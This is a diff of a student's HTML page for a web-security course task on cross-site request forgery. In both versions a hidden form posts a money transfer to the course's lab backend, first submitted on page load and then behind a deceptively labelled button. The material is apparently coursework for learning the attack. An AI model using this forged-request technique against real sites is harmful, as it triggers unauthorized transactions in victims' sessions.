@@ -1,39 +1,27 @@
 <html>
-<head>
-    <title>Task 4.2: CSRF</title>
-    <meta name="referrer" content="no-referrer" />
-</head>
-<body onload="document.getElementById('attack-form').submit()">
+  <head>
+    <title>4.2: CSRF</title>
+  </head>
+
+  <body>
+    <button onclick="runCSRFAttack()">Totally inconspicuous button that you should click</button>
+
     <form
       id="attack-form"
       method="POST"
       action="https://cse543.websecurity.ngrok.pizza/backend/tfourtwo"
-      style="display: none"
+      style="display:none"
     >
-      <input type="hidden" name="username" value="skp6318" />
-
-      <input type="hidden" name="fname" value="Attack_Surya" />
-
-      <input type="hidden" name="amount" value="1000" />
-      <input type="hidden" name="comment" value="CSRF Attack" />
-
-      <input type="hidden" name="dataForm" value="" />
+      <input type="hidden" name="username" value="skp6318">
+      <input type="hidden" name="fname" value="Surya">
+      <input type="hidden" name="amount" value="100000">
+      <input type="hidden" name="comment" value="CSRF Attack">
     </form>
-    <form method="post" id="benign-form">
-        <div class="question-container">
-            <p>Transfer Money (Authenticated Users)</p>
-            <input type="hidden" name="username" value="skp6318"/>
-            <label>Recipient Name : </label>
-            <input type="text" placeholder="Enter first name" name="fname" class="small-input-box" required="">
-            <div class="vertical-divider"></div>
-            <label>Amount to be sent : </label>
-            <input type="text" placeholder="Enter valid positive integer" name="amount" class="small-input-box" required="">
-            <div class="vertical-divider"></div>
-            <label>Comments : </label>
-            <input type="text" placeholder="Enter your comments" name="comment" class="small-input-box" required="">
-            <div class="vertical-divider"></div>
-            <button type="submit" name="dataForm">Submit</button>
-        </div>
-    </form>
-</body>
+
+    <script>
+      function runCSRFAttack() {
+        document.getElementById("attack-form").submit();
+      }
+    </script>
+  </body>
 </html>
